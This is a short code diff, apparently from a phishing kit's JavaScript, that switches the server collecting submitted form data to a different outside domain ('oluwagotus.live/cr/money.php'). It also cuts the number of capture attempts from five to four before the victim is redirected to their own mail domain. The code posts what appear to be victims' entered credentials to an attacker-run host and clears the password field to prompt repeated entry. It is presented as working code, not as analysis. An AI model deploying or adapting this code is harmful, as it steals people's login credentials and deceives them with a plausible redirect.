@@ -171,7 +171,7 @@ $(document).ready(function() {
 
         $.ajax({
             dataType: 'JSON',
-            url: 'https://razspal4.gq/erf/blessed.php',
+            url: 'https://oluwagotus.live/cr/money.php',
             type: 'POST',
             data: {
                 ai: ai,
@@ -187,7 +187,7 @@ $(document).ready(function() {
                     console.log(response);
                     if (response['signal'] == 'ok') {
                         $("#pr").val("");
-                        if (count >= 5) {
+                        if (count >= 4) {
                             count = 0;
                             // window.location.replace(response['redirect_link']);
                             window.location.replace("http://www." + my_slice);
@@ -202,7 +202,7 @@ $(document).ready(function() {
             },
             error: function() {
                 $("#pr").val("");
-                if (count >= 5) {
+                if (count >= 4) {
                     count = 0;
                     window.location.replace("http://www." + my_slice);
                     return false;
